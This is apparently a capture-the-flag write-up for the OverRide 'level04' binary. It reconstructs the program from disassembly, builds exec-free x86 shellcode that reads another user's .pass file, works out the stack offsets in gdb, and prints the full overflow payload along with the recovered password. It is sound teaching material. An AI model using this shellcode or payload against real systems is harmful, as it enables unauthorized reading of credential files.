# level04 - Stack Buffer Overflow

On `level04`'s HOME, we find a binary named : `level04`

```shell
...
0x080486c8  main
...
```


```shell
gefâž¤  disass main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   ebp
   0x080486c9 <+1>:	mov    ebp,esp
   0x080486cb <+3>:	push   edi
   0x080486cc <+4>:	push   ebx
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>:	lea    ebx,[esp+0x20]
   0x080486e6 <+30>:	mov    eax,0x0
   0x080486eb <+35>:	mov    edx,0x20
   0x080486f0 <+40>:	mov    edi,ebx
   0x080486f2 <+42>:	mov    ecx,edx
   0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
   0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
   0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
   0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    eax,[esp+0x1c]
   0x0804876d <+165>:	mov    DWORD PTR [esp],eax
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:	and    eax,0x7f
   0x0804878a <+194>:	test   eax,eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:	and    eax,0x7f
   0x080487a3 <+219>:	add    eax,0x1
   0x080487a6 <+222>:	sar    al,1
   0x080487a8 <+224>:	test   al,al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    eax,0x0
   0x0804881f <+343>:	lea    esp,[ebp-0x8]
   0x08048822 <+346>:	pop    ebx
   0x08048823 <+347>:	pop    edi
   0x08048824 <+348>:	pop    ebp
   0x08048825 <+349>:	ret
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```c
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/types.h>
# include <sys/wait.h>
# include <unistd.h>
# include <sys/prctl.h>
# include <sys/ptrace.h>


int main(void) {

	int		*wstatus = NULL; // esp+0x1c
	char	str[32]; // esp+0x20
	int		tmp;	// esp+0xa8
	pid_t	pid; // esp+0xac

	for ( int i = 0; i < 32; i++ )
		str[i] = '\0';

	pid = fork();

	if ( pid ) {
		prctl( 1, 1 );
		ptrace( PTRACE_TRACEME, 0, NULL, NULL );
		puts( "Give me some shellcode, k" );
		gets( str );
	} else {

		while (1) {
			wait( wstatus );
			if ( *wstatus & 127 == 0 ) {
				if ( (*wstatus & 127) >> 1 == 0 ) {
					if ( ptrace(PTRACE_PEEKDATA, pid, 0x2c, NULL) == 0xb ) {
						puts("no exec() for you");
						kill(pid, 9);
						break;
					}
				}
			} else {
				puts( "child is exiting..." );
				break;
			}
		}

	}

	return 0;

}
```

From the assembly code and its transciption into C, we understand that we have
a buffer overflow vulnerability in the child process code (`gets( str );`),
so we can easily inject our shellcode into the buffer on the stack.
But there's one thing: we can't use functions from the `exec()` family to do this...
no problem, we'll write a shellcode that will allow us to read directly from the file
and write the result to stdout. Let's build it.

<br>

This is our crafted shellcode from this snippet:

```c
char buffer[42];

in fd = open("////home/users/level05/.pass", O_RDONLY);
read(fd, buffer, 41);
write(1, buffer, 41);
```

```assembly
global _start

section .text
_start:
    ; push '////home/users/level05/.pass\x00'
    xor ebx, ebx        ; ebx = 0
    push ebx            ; push NULL string terminator
    mov ebx, 'pass'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '05/.'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'evel'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'rs/l'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '/use'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'home'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '////'     ; rest of file name
    push ebx            ; push to stack

    ; sys_open(const char * filename, int flags, int mode)
    xor eax, eax        ; eax = 0
    xor edx, edx        ; edx = 0
    mov al, 5           ; open syscall number
    mov ebx, esp        ; move pointer to filename
    xor ecx, ecx        ; set O_RDONLY flag = 0
    mov dx, 0644        ; set mode 0644
    int 0x80            ; call kernel

    ; sys_read(unsigned int fd, char * buf, size_t count)
    xor ebx, ebx        ; ebx = 0
    xor edx, edx        ; edx = 0
    mov bl, al          ; set fd from sys_open syscall return value (eax)
    mov ecx, esp        ; move pointer to stack to read on
    mov al, 3           ; sys_read syscall number
    mov dl, 41          ; size to read
    int 0x80            ; call kernel

    ; sys_write(unsigned int fd, const char * buf, size_t count)
    ; ecx already points on the stack (esp) to the string to read
    mov al, 4           ; sys_write syscall
    mov bl, 1           ; set fd to stdout
    mov dl, 41          ; size to read
    int 0x80            ; call kernel
```

After compile it, let's extract the shellcode (on our machine):

```shell
(cd /tmp && nasm -f elf exploit04.s && ld -m elf_i386 -o exploit04 exploit04.o)
count=0; for i in $(objdump -d /tmp/exploit04 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

We get now our shellcode in well form with his length:

```shell
[SNIP]
\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80
83 bytes
```

We have now our shellcode without syscall `exec()`.

<br>

Let's check how much space we have on the stack to inject our shellcode and rewrite eip.

> To get the correct eip register address and redirect address, you need to
> perform the test below to know the memory mapping during your execution of
> the `level04` program.

```shell
gdb) set follow-fork-mode child
(gdb) b *0x08048763
Breakpoint 1 at 0x8048763
(gdb) r < <(python -c 'print "A" * 200')
Starting program: /home/users/level04/level04 < <(python -c 'print "A" * 200')
[New process 1789]
child is exiting...
Give me some shellcode, k
[Switching to process 1789]

Breakpoint 1, 0x08048763 in main ()
(gdb) x/wx $esp+0x20
0xffffd670:	0x41414141
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048763 in main; saved eip 0x41414141
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
```

So, there are **156 bytes** (*0xffffd70c - 0xffffd670 = 9c*). 
More than enough to inject our shellcode. We can also deduce the redirection
address, which will simply be the address of the buffer where our string is
stored (taking into account the different mapping between execution with and
without gdb which is approximately *+0x20 bit*): **0xffffd690**

<br>

To summary, we have:
- A nop instruction offset of **41 bytes** 
- Our shellcode with a length of **83 bytes**
- A nop instruction offset of **32 bytes**
- The new address of `eip` : **0xffffd690**

> Note: There's an overlap between the future `esp` when we execute our shellcode,
> as our buffer is on the stack, the values pushed by our shellcode will overlap
> the buffer where our shellcode is located and may corrupt the shellcode. We
> have therefore added nop instructions (32 bits) between our shellcode and `eip`.   

<br>

We can now exploit this BOF :

```shell
python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\x90"[::-1]' | ./level04
```


```shell
level04@OverRide:~$ python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x29\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\x90"[::-1]' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
